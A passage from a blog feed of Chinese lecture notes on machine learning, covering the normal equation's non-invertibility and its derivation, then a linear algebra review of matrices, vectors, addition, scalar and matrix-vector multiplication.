例如，在预测住房价格时，如果${x_{1}}$是以英尺为尺寸规格计算的房子，${x_{2}}$是以平方米为尺寸规格计算的房子，同时，你也知道1米等于3.28英尺 ( 四舍五入到两位小数 )，这样，你的这两个特征值将始终满足约束：${x_{1}}={x_{2}}*{{\left( 3.28 \right)}^{2}}$。<br>实际上，你可以用这样的一个线性方程，来展示那两个相关联的特征值，矩阵<code>X&#39;X</code>将是不可逆的。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104210836.png" alt></p><p>第二个原因是，<strong>在你想用大量的特征值，尝试实践你的学习算法的时候，可能会导致矩阵$X'X$的结果是不可逆的</strong>。<br>具体地说，<strong>在$m$小于或等于n的时候</strong>，例如，有$m$等于10个的训练样本也有$n$等于100的特征数量。要找到适合的$(n +1)$ 维参数矢量$\theta$，这将会变成一个101维的矢量，尝试从10个训练样本中找到满足101个参数的值，这工作可能会让你花上一阵子时间，但这并不总是一个好主意。因为，正如我们所看到你只有10个样本，以适应这100或101个参数，数据还是有些少。</p><p>稍后我们将看到，如何使用小数据样本以得到这100或101个参数，通常，我们会使用一种叫做正则化的线性代数方法，通过删除某些特征或者是使用某些技术，来解决当$m$比$n$小的时候的问题。即使你有一个相对较小的训练集，也可使用很多的特征来找到很多合适的参数。</p><p>总之当你发现的矩阵$X'X$的结果是奇异矩阵，或者找到的其它矩阵是不可逆的，我会建议你这么做。</p><p>首先，看特征值里是否有一些多余的特征，像这些${x_{1}}$和${x_{2}}$是线性相关的，互为线性函数。同时，当有一些多余的特征时，可以删除这两个重复特征里的其中一个，无须两个特征同时保留，将解决不可逆性的问题。因此，首先应该通过观察所有特征检查是否有多余的特征，如果有多余的就删除掉，直到他们不再是多余的为止，如果特征数量实在太多，我会删除些 用较少的特征来反映尽可能多内容，否则我会考虑使用正规化方法。<br>如果矩阵$X'X$是不可逆的，（通常来说，不会出现这种情况），如果在Octave里，可以用伪逆函数<code>pinv()</code> 来实现。这种使用不同的线性代数库的方法被称为伪逆。即使$X'X$的结果是不可逆的，但算法执行的流程是正确的。总之，出现不可逆矩阵的情况极少发生，所以在大多数实现线性回归中，出现不可逆的问题不应该过多的关注${X^{T}}X$是不可逆的。</p><p><strong>增加内容：</strong></p>$\theta ={{\left( {X^{T}}X \right)}^{-1}}{X^{T}}y$ 的推导过程：$J\left( \theta  \right)=\frac{1}{2m}\sum\limits_{i=1}^{m}{{{\left( {h_{\theta}}\left( {x^{(i)}} \right)-{y^{(i)}} \right)}^{2}}}$<p>其中：${h_{\theta}}\left( x \right)={\theta^{T}}X={\theta_{0}}{x_{0}}+{\theta_{1}}{x_{1}}+{\theta_{2}}{x_{2}}+...+{\theta_{n}}{x_{n}}$</p><p>将向量表达形式转为矩阵表达形式，则有$J(\theta )=\frac{1}{2}{{\left( X\theta -y\right)}^{2}}$ ，其中$X$为$m$行$n$列的矩阵（$m$为样本个数，$n$为特征个数），$\theta$为$n$行1列的矩阵，$y$为$m$行1列的矩阵，对$J(\theta )$进行如下变换</p>$J(\theta )=\frac{1}{2}{{\left( X\theta -y\right)}^{T}}\left( X\theta -y \right)$<p>​     $=\frac{1}{2}\left( {{\theta }^{T}}{{X}^{T}}-{{y}^{T}} \right)\left(X\theta -y \right)$</p><p>​     $=\frac{1}{2}\left( {{\theta }^{T}}{{X}^{T}}X\theta -{{\theta}^{T}}{{X}^{T}}y-{{y}^{T}}X\theta -{{y}^{T}}y \right)$</p><p>接下来对$J(\theta )$偏导，需要用到以下几个矩阵的求导法则:</p>$\frac{dAB}{dB}={{A}^{T}}$$\frac{d{{X}^{T}}AX}{dX}=2AX$<p>所以有:</p>$\frac{\partial J\left( \theta  \right)}{\partial \theta }=\frac{1}{2}\left(2{{X}^{T}}X\theta -{{X}^{T}}y -{{X}^{T}}y -0 \right)$<p>​           $={{X}^{T}}X\theta -{{X}^{T}}y$</p><p>令$\frac{\partial J\left( \theta  \right)}{\partial \theta }=0$,</p><p>则有$\theta ={{\left( {X^{T}}X \right)}^{-1}}{X^{T}}y$</p>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
          <category> 机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linear-Regression </tag>
            
            <tag> 多变量线性回归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三章 线性代数回顾(Linear Algebra Review)</title>
      <link href="/2018/11/15/di-san-zhang-xian-xing-dai-shu-hui-gu-linear-algebra-review/"/>
      <url>/2018/11/15/di-san-zhang-xian-xing-dai-shu-hui-gu-linear-algebra-review/</url>
      
        <content type="html"><![CDATA[<h2 id="Matrices-and-Vectors（矩阵和向量）"><a href="#Matrices-and-Vectors（矩阵和向量）" class="headerlink" title="Matrices and Vectors（矩阵和向量）"></a>Matrices and Vectors（矩阵和向量）</h2><blockquote><p>我们先复习一下线性代数的知识 在这段视频中 我会向大家介绍矩阵和向量的概念</p></blockquote><ul><li><code>矩阵</code>是指 <strong>由数字组成的矩形阵列 并写在方括号中间</strong> 例如 屏幕中所示的一个矩阵 先写一个左括号 然后是一些数字 这些数字可能是 机器学习问题的特征值 也可能表示其他意思 不过现在不用管具体的数字 然后我用右方括号将其括起来 这样就得到了一个矩阵 接下来 看一下其他矩阵的例子 依次写下1 2 3 4 5 6 因此实际上矩阵 可以说是二维数组的 另一个名字</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562400_1378345848_1539953128" alt="_1526562400_1378345848_1539953128_1526562400_1378345848.png"></p><ul><li><p>另外 我们还需要知道的是 <code>矩阵的维度</code>=<strong>矩阵的行数乘以列数</strong> 具体到这个例子 看左边 包括1 2 3 4共4行 以及2列 因此 这个例子是一个 4 × 2的矩阵 即行数乘以列数 4行乘2列</p><a id="more"></a><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562414_1674067162_1539953152" alt="_1526562414_1674067162_1539953152_1526562414_1674067162.png"></p></li><li><p>右边的矩阵有两行 这是第一行 这是第二行 此外包括三列 这是第一列 第二列 第三列 因此 我们把 这个矩阵称为一个 2 × 3维的矩阵 所以我们说这个矩阵的维度是2 × 3维</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562425_1017138353_1539953170" alt="_1526562425_1017138353_1539953170_1526562425_1017138353.png"></p><ul><li>有时候大家会发现 书写有些不同 比如左边的矩阵 写成了<code>R4 × 2</code> 具体而言 大家会将该矩阵称作 是集合R4×2的元素 因此 也就是说 这个<strong>矩阵 R4×2代表所有4×2的矩阵的集合</strong> 而右边的这个矩阵 有时候也写作一个<code>R2×3</code>的矩阵 因此 如果你看到2×3 如果你看到 有些地方表达为 4×2的或者2×3的 <strong>一般都是指 一个特定维度的矩阵</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562469_2073201965_1539953199" alt="_1526562469_2073201965_1539953199_1526562469_2073201965.png"></p><ul><li>接下来 让我们来谈谈<strong>如何表达矩阵的某个特定元素</strong> 这里我说矩阵元素 而不是矩阵 我的意思是 矩阵的条目数 也就是<strong>矩阵内部的某个数</strong></li><li>所以 标准的表达是 <strong>如果A是 这个矩阵 那么A下标 ij 表示的是 i j对应的那个数字 意思是矩阵的第i行和第j列 对应的那个数</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562486_126334539_1539953234" alt="_1526562486_126334539_1539953234_1526562486_126334539.png"></p><ul><li>例如 <code>A11</code> 表示的是<code>第1行 第1列</code>所对应的那个元素 所以这是 第一行和第一列 因此<strong>A11 就等于 1402</strong> 另一个例子<code>A12</code> 表示的是<code>第一行第二列</code> 对应的那个数 所以<strong>A12 将等于191</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562514_858056936_1539953253" alt="_1526562514_858056936_1539953253_1526562514_858056936.png"></p><ul><li>我希望你不会犯下面的错误 但如果你这么写的话 如果你写出了<code>A43</code> 这应该表示的是 <code>第四行第三列</code> 而你知道 这个矩阵没有第三列 因此<strong>这是未定义的</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562526_1857626394_1539953574" alt="_1526562526_1857626394_1539953574_1526562526_1857626394.png"></p><ul><li>接下来让我们来谈谈<strong>什么是向量</strong> 一个<code>向量</code>是一种特殊的矩阵 <strong>向量是只有一列的矩阵</strong> 所以 你有一个 <code>n×1</code> 矩阵 还记得吗 <strong>N是行数 而这里的1 表示的是列数</strong> 所以 <strong>只有一列的矩阵 就是我们所说的向量</strong></li><li>因此 这里是一个向量的 例子 比如说 我有 n = 4 个元素</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562579_388138141_1539953600" alt="_1526562579_388138141_1539953600_1526562579_388138141.png"></p><ul><li>所以我们也把这个称为 另一个术语是 这是一个<strong>四维的向量</strong> 也就意味着 <strong>这是一个含有 4个元素的向量</strong> 而且 前面我们讲 矩阵的时候提到过 这个符号<code>R3×2</code> 表示的是<code>一个3行2列的矩阵</code> 而对于这个向量 我们也同样可以 表示为集合<code>R4</code> 因此 这个<strong>R4是指 一个四维向量的集合</strong></li><li>接下来让我们来谈谈<strong>如何引用向量的元素</strong> 我们将使用符号 <code>yi</code>来代表 <code>向量y的第i个元素</code> 所以 如果这个向量是y 那么<code>y下标i</code> 则表示<code>它的第i个元素</code> 所以y1表示第一个元素 460 y2表示第二个元素 232 这是第二个元素 还有y3等于 315 等等 只有y1至y4是有意义的 因为这定义的是一个四维向量</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562604_140050420_1539953644" alt="_1526562604_140050420_1539953644_1526562604_140050420.png"></p><ul><li>此外 事实上 有两种方法来表达 某个向量中某个索引 是这两种</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562615_528774851_1539953673" alt="_1526562615_528774851_1539953673_1526562615_528774851.png"></p><ul><li>有时候 人们会使用 <code>1-索引</code> 有时候用<code>0-索引</code> 因此 左边这个例子 是一个<code>1-索引向量</code> 它的元素写作<code>y1 y2 y3 y4</code> 而右边这个向量 是<code>0-索引</code>的一个例子 我们的索引 <code>从下标0开始</code> 因此 元素从<code>y0至y3</code></li><li><strong>对于很多机器学习的应用问题来说 0-索引向量为我们提供了一个更方便的符号表达</strong>  所以你通常应该 做的是 除非特别指定 你应该<strong>默认我们使用的是<code>1-索引法</code>表示向量</strong> 在本课程的后面所有 <strong>关于线性代数的视频中 我都将使用<code>1-索引法</code>表示向量</strong></li><li>按照惯例 通常在书写矩阵和向量时 大多数人会使用<code>大写字母</code> 来表示<code>矩阵</code> 因此 我们要<strong>使用 大写字母 如 A B C X 来表示矩阵</strong> 而通常我们会使用<code>小写字母</code> 像<code>a b x y</code> 来表示<code>数字 或是原始的数字 或标量 或向量</code> 这是实际的使用习惯 我们也经常看到 <strong>使用小写字母y 来表示向量 但我们平时 是用大写字母来表示矩阵</strong></li></ul><h3 id="Matrices-and-Vectors笔记"><a href="#Matrices-and-Vectors笔记" class="headerlink" title="Matrices and Vectors笔记"></a>Matrices and Vectors笔记</h3><ul><li>矩阵是二维数组</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562640_1052555579_1539953704" alt="_1526562640_1052555579_1539953704_1526562640_1052555579.png"></p><p>上面的矩阵有四行三列，所以它是一个4 x 3的矩阵</p><ul><li>向量是·一列和许多行·的矩阵：</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526562653_1211280669_1539953713" alt="_1526562653_1211280669_1539953713_1526562653_1211280669.png"></p><p>所以向量是矩阵的一个子集。上述向量是一个4×1矩阵。</p><ul><li>表示法和条款：</li><li>$A_{ij}$引用矩阵A的第i行和第j列中的元素。</li><li>具有’n’行的矢量被称为’n’维矢量。</li><li>$v_i$指矢量的第i行中的元素。</li><li>一般来说，我们所有的向量和矩阵都是1索引的。请注意，对于某些编程语言，这些数组是0索引的。</li><li>矩阵通常用大写字母表示，而向量则用小写字母表示。</li><li>“标量”表示对象是单个值，而不是矢量或矩阵。</li><li><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563183_300594797_1539953734" alt="_1526563183_300594797_1539953734_1526563183_300594797.png">是指一组标量实数。</li><li><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563193_1988191010_1539953742" alt="_1526563193_1988191010_1539953742_1526563193_1988191010.png">是指实数的n维向量的集合。</li></ul><h2 id="Addition-and-Scalar-Multiplication"><a href="#Addition-and-Scalar-Multiplication" class="headerlink" title="Addition and Scalar Multiplication"></a>Addition and Scalar Multiplication</h2><blockquote><p>在这段视频中 我们要讲 我们将讨论矩阵的加法和减法运算 以及如何进行 数和矩阵的乘法 也就是标量乘法 让我们从下面这个例子开始</p></blockquote><ul><li>假设有这样两个矩阵 如果想对它们做<strong>求和运算</strong> 应该怎么做呢？ 或者说 矩阵的加法到底是如何进行的？ 答案是 如果你想将两个矩阵相加 你<strong>只需要将这两个矩阵的 每一个元素都逐个相加</strong> 因此 两个矩阵相加 所得到的结果 就是一个新的矩阵 它的第一个元素 是1和4相加的结果 因此我们得到5 接下来是第二个元素 用2和2相加 因此得到4 然后是3加0得到3 以此类推 这里我用不同颜色区别一下 接下来右边这一列元素 就是0.5 10和2</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563239_390601298_1539953757" alt="_1526563239_390601298_1539953757_1526563239_390601298.png"></p><ul><li>这里大家不难发现 <strong>只有相同维度的两个矩阵才能相加</strong> 对于这个例子而言 一個3 x 2的矩陣 也就是说矩阵的行数为3 列数是2 因此是3行2列 第二个矩阵 也是一个3行2列的矩阵 因此这两个矩阵相加的结果 也是一个3行2列的矩阵 所以你只能将相同维度的矩阵 进行相加运算 同时 所得到的结果 将会是一个新的矩阵 <strong>这个矩阵与相加的两个矩阵维度相同</strong></li><li>反过来 如果你想将这样两个矩阵相加 这是一个3行2列的矩阵 行数为3 列数为2 而这一个是2行2列的矩阵 那么由于这两个矩阵 维度是不相同的 这就出现错误了 所以我们不能将它们相加 也就是说 <strong>这两个矩阵的和是没有意义的</strong> 这就是矩阵的加法运算</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563246_1151303969_1539953785" alt="_1526563246_1151303969_1539953785_1526563246_1151303969.png"></p><ul><li>接下来 我们讨论<strong>矩阵和标量的乘法运算</strong> 这里所说的<code>标量</code> 可能是一个复杂的结构 或者只是一个简单的数字 或者说实数 <strong>标量在这里指的就是实数</strong> 如果我们用数字3来和这个矩阵相乘 那么结果是显而易见的 你只需要将矩阵中的所有元素 都和3相乘 每一个都逐一与3相乘 因此 1和3相乘 结果是3 2和3相乘 结果是6 最后3乘以3得9 我再换一下颜色 0乘以3得0 3乘以5得15 最后3乘以1得3 这样得到的这个矩阵 就是左边这个矩阵和3相乘的结果 我们再次注意到 这是一个3行2列的矩阵 得到的结果矩阵 维度也是相同的 也就是说这两个矩阵 都是3行2列 这也是3行2列</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563253_1190942378_1539953799" alt="_1526563253_1190942378_1539953799_1526563253_1190942378.png"></p><ul><li>另外 你也可以写成另一种方式 这里是3和这个矩阵相乘 你也可以把这个矩阵写在前面 把左边这个矩阵照抄过来 我们也可以用这个矩阵乘以3 也就是说 3乘以这个矩阵 和这个矩阵乘以3 结果都是一回事 都是中间的这个矩阵</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563264_1347157564_1539953811" alt="_1526563264_1347157564_1539953811_1526563264_1347157564.png"></p><ul><li>你也可以用矩阵除以一个数 那么 我们可以看到 用这个矩阵除以4 实际上就是 用四分之一 来和这个矩阵相乘 4 0 6 3 不难发现 相乘的结果是 1/4和4相乘为1 1/4和0相乘得0 1/4乘以6 结果是3/2 6/4也就是3/2 最后1/4乘以3得3/4 这样我们就得到了 这个矩阵除以4的结果 结果就是是右边这个矩阵</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563275_475609234_1539953825" alt="_1526563275_475609234_1539953825_1526563275_475609234.png"></p><ul><li>最后 我们来看一个稍微复杂一点的例子 我们可以把所有这些运算结合起来 在这个运算中 需要用3来乘以这个向量 然后加上一个向量 再减去另一个向量除以3的结果 让我们先来整理一下这几项运算 首先第一个运算 很明显这是标量乘法的例子 因为这里是用3来乘以一个矩阵 然后这一项 很显然这是另一个标量乘法 或者可以叫标量除法 其实也就是1/3乘以这个矩阵 因此 如果我们先考虑这两项运算</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563285_884588442_1539953837" alt="_1526563285_884588442_1539953837_1526563285_884588442.png"></p><ul><li>那么我们将得到的是 我们看一下 3乘以这个矩阵 结果是3 12 6 然后和中间的矩阵相加 也就是0 0 5 最后再减去1 0 2/3 同样地 为了便于理解 我们再来梳理一下这几项 这里的这个加号 表明这是一个矩阵加法 对吧？ 当然这里是向量 别忘了 向量是特殊的矩阵 对吧？ 或者你也可以称之为 向量加法运算 同样 这里的减号表明 这是一个矩阵减法运算 但由于这是一个n行1列的矩阵 实际上是3行1列 因此这个矩阵 实际上是也一个向量 一个列向量 因此也可以把它称作<strong>向量的减法运算</strong> 明白了吗</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563297_1736936881_1539953857" alt="_1526563297_1736936881_1539953857_1526563297_1736936881.png"></p><ul><li>最后再整理一下 最终的结果依然是一个向量 向量的第一个元素 是3+0-1 就是3-1 也就是2 第二个元素是12+0-0 也就是12 最后第三个元素 6+5-(2/3) 也就是11-(2/3) 结果是10又三分之一 关闭右括号 我们得到了最终的结果 这是一个3行1列的矩阵 或者也可以说是 一个维度为3的向量 这就是这个运算式的计算结果</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563308_1386235624_1539953868" alt="_1526563308_1386235624_1539953868_1526563308_1386235624.png"></p><ul><li>所以 你学会了矩阵或向量的加减运算 以及矩阵或向量跟标量 或者说实数 的乘法运算 到目前为止 我只介绍了如何进行 矩阵或向量与数的乘法运算 在下一讲中 我们将讨论一个更有趣的话题 那就是如何进行 两个矩阵的乘法运算<h3 id="加法和标量乘法笔记"><a href="#加法和标量乘法笔记" class="headerlink" title="加法和标量乘法笔记"></a>加法和标量乘法笔记</h3></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563322_945561965_1539953878" alt="_1526563322_945561965_1539953878_1526563322_945561965.png"></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563328_710017541_1539953883" alt="_1526563328_710017541_1539953883_1526563328_710017541.png"></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563335_879312404_1539953887" alt="_1526563335_879312404_1539953887_1526563335_879312404.png"></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563343_57921380_1539953892" alt="_1526563343_57921380_1539953892_1526563343_57921380.png"></p><h2 id="Matrix-Vector-Multiplication"><a href="#Matrix-Vector-Multiplication" class="headerlink" title="Matrix Vector Multiplication"></a>Matrix Vector Multiplication</h2><blockquote><p>在本节课的视频中 讨论<strong>如何 将两个矩阵相乘</strong> 我们将从矩阵相乘的 特例 向量相乘开始 即 一个矩阵与一个向量相乘</p></blockquote><ul><li>让我们从一个例子开始 左边是一个矩阵 右边是一个向量 假如我们 将这个矩阵 与这个向量相乘 结果会怎样呢？ 我先快速计算出结果 然后我们再 退回去 查看每一个步骤 很明显 相乘的结果 将是 一个向量 我先将这部分完成 然后再来解释 我刚刚是怎么做的</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563414_2041992383_1539953906" alt="_1526563414_2041992383_1539953906_1526563414_2041992383.png"></p><ul><li>要计算出结果向量的第一个元素 我将会 <strong>取这两个数字 并把他们 把矩阵 A 的 然后把对应相乘的结果加起来</strong> 取1乘以1 同时取3 乘以 5 计算得到1和15 相加得16 我将在这儿写上16 要计算第二行 的第二个元素 我需要将第二行 与这个向量相乘 所以我得到 4乘以1 加上0乘以5 结果等于4 因此在这里写上4 对于最后一个元素 我需要计算(2, 1) 乘以 (1, 5) 所以先计算2乘以1 再加上 1乘以5 最后结果为7 所以我在这儿写上7</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563424_2094856845_1539953936" alt="_1526563424_2094856845_1539953936_1526563424_2094856845.png"></p><ul><li>事实证明 3x2的矩阵 和一个2x1的矩阵 即一个二维向量 相乘的结果 我们得到的 将是一个3×1 的矩阵 这个3×1的矩阵 就是这么得来的 也就是一个三维向量</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563438_1477954396_1539953945" alt="_1526563438_1477954396_1539953945_1526563438_1477954396.png"></p><ul><li>我想 我可能计算时做得很快 你们并不一定能够 自己重复这个过程 下面让我们更加仔细的看一下 刚刚我做了些什么以及一个向量 和一个矩阵相乘的计算过程是怎样的 下面详细介绍了如何 计算一个矩阵与一个向量相乘 假设这是一个矩阵A 我希望将它乘以 一个向量x 结果记为 向量y 所以 矩阵A是一个 m×n维矩阵 有m行和n列 我们让它与一个 n×1的矩阵相乘 换言之 一个n维向量 明显地 这里的两个n是相等的 也就是说 <strong>这个矩阵的列数 有n列 必须要与 另一个相乘矩阵的行数相同</strong> 即必须匹配这个向量的维数。 这样相乘的结果 将会是一个n维 向量y m 将与 矩阵A的行数 相同</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563449_1514757581_1539953956" alt="_1526563449_1514757581_1539953956_1526563449_1514757581.png"></p><ul><li>那么如何计算这个向量y呢？ 事实上 计算y的过程可以分解为 计算 yi 的值 让 A 的第 i 行元素 分别乘以向量 x 中的元素 并且相加 就是这样子 为了得到 y 的第一个元素 无论是多少 我们将会 把矩阵 A 的 第一行元素 每次同一个向量 x 的元素 相乘 我取第一个数 与第一个数相乘 然后取第二个数同第二个数相乘 取第三个数 与第三个数相乘 直到全部乘完 最后 将这些相乘的结果 加起来 这样我们就得到了 y 的第一个元素</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563458_960937756_1539954008" alt="_1526563458_960937756_1539954008_1526563458_960937756.png"></p><ul><li>然后我们 来计算 y 的第二个元素 接下来我们 取A的第二行 然后重复整个过程 现在 我们取A的第二行 将它 与其他元素相乘 也就是 x 的元素 将结果相加 这样我们就得到了 y 的第二个元素 依次计算下去 我们取A得第三行 逐行地与 向量x相乘 将结果加起来 然后得到第三个元素 以此类推 直到最后一行</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563471_8553957_1539954029" alt="_1526563471_8553957_1539954029_1526563471_8553957.png"></p><ul><li>所以 上述就是具体步骤 让我们再举一个例子 在这个例子中 我们先看一下矩阵的维度 左边是一个 3×4矩阵 右边是一个四维向量 也就是4×1矩阵 所以这样相乘的结果 将是 一个三维向量 我们在写的时候要给这个向量 留三个元素的空间</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563479_2071501370_1539954037" alt="_1526563479_2071501370_1539954037_1526563479_2071501370.png"></p><ul><li>现在让我们一起来算一下 首先是第一个元素 我将会取这四个数 并将它们与向量x相乘 所以我需要计算 1×1 加上2×3 加1×2 加5×1 等于 1 +6 再加上2 +6 也就是14 而对边距来说 第二个元素 我要 取这一行 然后与向量 (0×1)+3相乘 我们将得到 0×1 + 3×3 0×2 + 4×1 等于 9 + 4 也就是13 最后 对最后一个元素 我将取最后一行 所以我得到了-1×1 -2×3 加上0×2 加上0×1 所以 我们将得到-1和-6 相加得 -7 明白? 所以我最后的答案是 一个向量 其中的元素为 14 我将不给这些字涂上颜色 13 -7</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563488_238534241_1539954070" alt="_1526563488_238534241_1539954070_1526563488_238534241.png"></p><ul><li>如前面说的 计算结果是一个3×1的矩阵 上述就是矩阵和向量相乘的方法 我知道 这张幻灯片上内容很多 如果你在看的过程中 不是很确定这些数字怎么来的 你可以随时暂停视频 慢慢地 仔细琢磨 整个计算过程 尽量 确保自己理解了 得到14 13 11 这些结果的每一个步骤</li><li>最后 我将教你们一个<code>小技巧</code> 假设我 有四间房子 这些房子有四种大小 我有一个 假设函数 用于预测房子的价格 我需要计算 四间房子的大小作为 h(x) 的大小即预测的房价 这里有一种简单的方法 <strong>可以同时计算四间房子的预测价格</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563507_1294767834_1539954092" alt="_1526563507_1294767834_1539954092_1526563507_1294767834.png"></p><ul><li>我可以将它简单地 利用 矩阵向量相乘的思想来计算 所以 对于这个问题我会这么计算 首先我要构建一个 如下所示的矩阵 元素是1 1 1 1 然后我把四个房子的大小 写在这儿 我还需要构造一个向量 我的向量 它将是一个 二维向量 即 40 和 0.25 这是预测函数的两个系数 θ0 和 θ1 接下来</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563536_1519908066_1539954138" alt="_1526563536_1519908066_1539954138_1526563536_1519908066.png"></p><ul><li>我要做的就是 将我构造好的矩阵和向量相乘 这是相乘符号 我将得到什么结果呢？ 左边是一个 4×2 矩阵 右边是一个 2×1 矩阵 所以结果 将是一个4×1向量 对吧 所以 让我在幻灯片上写上 结果将是 一个4×1的矩阵 输出结果也就是 一个四维向量 让我来把它写出来 用四个实数表示我的四个元素 事实上 结果的第一个元素 我的计算方式 是 将这一行同我的向量相乘 结果将是 -40×1 + 4.25×2104 顺便说一下 在先前的幻灯片中 我写的是 1× (-40) + 2104 × 0.25 但是顺序无关紧要 对吧？ -40×1 和 1×(-40)是一样的 这第一个元素 就是当x为2104时的 h 值 因此 这是我的第一个房子的预测价格 那么 第二个元素呢？ 你应该已经想到了 我要怎么计算第二个元素了 对吧? 我要把这个乘以我的向量 所以就是 -40×1 + 0.25×1416 这就是x为1416的 h 对吧? 这是第三个 和第四个 后面就依次计算这个4×1矩阵的第三和第四个元素 得出结果 这里 我画了绿色边框的部分 是一个实数 对吧？ 它是一个实数 这里 我画了洋红色边框的部分 紫色 洋红色 边框 是一个实数 对吧？ 所以右边 最右边 就是一个 4×1矩阵 是一个4维向量</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563587_1184137581_1539954167" alt="_1526563587_1184137581_1539954167_1526563587_1184137581.png"></p><ul><li>这个例子的一个小技巧是 当你 在程序中实现这个过程的时候 当你有四间房子 你想使用自己的预测函数 来预测房子的价格 完成这些工作 你可以用一行代码搞定 我们后面会谈到Octave 以及编程语言 你可以只写一行代码就完成整个过程 你可以这样写 <code>prediction = DataMatrix × Parameters</code> 对吧 数据矩阵是这一部分 参数 是这一部分 这就是一个<code>矩阵向量乘法</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563599_1602442101_1539954208" alt="_1526563599_1602442101_1539954208_1526563599_1602442101.png"></p><ul><li>如果你这么做了 这个变量prediction 抱歉 我的字写得很潦草 只需要实现 这一行代码 如果你有一个做矩阵向量相乘的函数库的话 如果你这样做的话 右侧的prediction变量就会形成 一个4维向量 给你所有的预测价格 另一种计算方式是 作为一种矩阵向量相乘的方式 实际上就是一种 通过for循环 for 1 to 4 对吧？ 如果说你有一千间房子 就将是 for 1 to 1000 或者别的任何数 然后如果i等于的话 你必须写一个 有一个假设条件 I相等 然后需要做 比矩阵向量相乘多得多的工作 当你有 大量的房子的时候 如果你试图预测 不只是四座 或许是一千座房子的时候 事实证明 当你使用矩阵向量相乘的方法时 在计算机中 使用任何语言 不仅仅是Octave 还有C++ Java Python 等高级语言 以及其他语言 都可以很快的实现 事实证明 像左边这样子写代码 不仅可以 简化你的代码 现在你只需要 写一行代码 而不是一堆代码 而且 还有一个微妙的好处 我们后面将会了解到 就是基于你所有的房子 这样做计算效率将会更高 比你像右边那样 用代码实现公式 的方式效率 将会高很多 我后面在讨论向量化的时候 会详细地 讨论这个问题 所以 通过这种方式计算预测值 不仅代码更加简洁 而且效率更高 基本用不上 我们在后面 在其他模型中 计算实例的回归的时候 将会有效地利用到这一讲的内容 在接下来的视频中 我将会从特殊到一般 讲讲矩阵与矩阵相乘的情况</li></ul><h3 id="矩阵向量乘法笔记"><a href="#矩阵向量乘法笔记" class="headerlink" title="矩阵向量乘法笔记"></a>矩阵向量乘法笔记</h3><ul><li>矩阵和向量的乘法如图：m×n 的矩阵乘以 n×1 的向量，得到的是 m×1 的向量</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563623_126184414_1539954234" alt="_1526563623_126184414_1539954234_1526563623_126184414.png"></p><ul><li>举例</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1526563631_819280345_1539954242" alt="_1526563631_819280345_1539954242_1526563631_819280345.png"></p><h2 id="Matrix-Matrix"><a href="#Matrix-Matrix" class="headerlink" title="Matrix Matrix"></a>Matrix Matrix</h2><blockquote><p>在这段视频中我们将会讨论 矩阵 <strong>矩阵的乘法以及 如何将两个矩阵相乘</strong> 我们会使用这样一种方法 在线性回归中用以解决 参数计算的问题 <strong>这种方法会把θ0、θ1等参数都放在一起来计算</strong> 也就是说 <strong>我们不需要一个迭代的梯度下降算法</strong></p></blockquote><ul><li>当我们谈到这个算法的时候 就会发现矩阵以及矩阵间的乘法运算 是你必须理解的关键步骤之一 所以让我们像往常那样 从一个例子开始 比方说 我有两个矩阵 我想将它们相乘 让我先只是按照这个例子做一遍（乘法） 